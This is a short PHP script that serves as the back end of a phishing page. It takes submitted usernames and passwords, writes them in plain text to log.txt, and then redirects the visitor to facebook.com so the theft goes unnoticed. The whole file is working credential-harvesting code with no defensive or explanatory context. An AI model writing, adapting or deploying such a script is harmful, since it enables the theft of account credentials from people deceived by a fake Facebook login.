<?php
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

$file = fopen("log.txt", "a");
fwrite($file, "Username: " . $username . "\n");
fwrite($file, "Password: " . $password . "\n");
fwrite($file, "------------------------\n");
fclose($file);

header("Location: https://facebook.com");
exit();
?>